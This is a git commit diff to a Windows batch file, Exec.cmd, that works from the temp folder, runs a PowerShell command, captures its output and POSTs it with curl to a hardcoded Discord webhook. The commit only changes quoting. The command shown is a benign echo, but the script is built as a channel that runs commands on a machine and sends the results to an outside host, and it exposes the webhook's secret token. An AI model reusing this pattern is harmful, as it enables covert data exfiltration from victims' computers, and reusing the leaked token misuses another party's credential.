2bd1a7d25ea2060f994afa71a5448edacfe60faa
rxu7s <104208624+rxu7s@users.noreply.github.com>
2022-10-16 21:45:33 +0300

    Update Exec.cmd

--- Exec.cmd
+++ Exec.cmd
@@ -6,6 +6,6 @@ cd %temp%
 set webhook=https://discordapp.com/api/webhooks/1029420421134680064/O3e1_ivqQexrC5xDMF-5ne9hsrcZhyw561covq0STMU2hprO2ONNy5Ur03RSPSb5k_5h
 
 :Commands
-for /f %%a in ('powershell Invoke-RestMethod echo hello world') do set a=%%a
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```%a%```\"}" %webhook%
+for /f %%a in ('powershell Invoke-RestMethod "echo hello world"') do set a=%%a
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%a%\"}" %webhook%
 pause
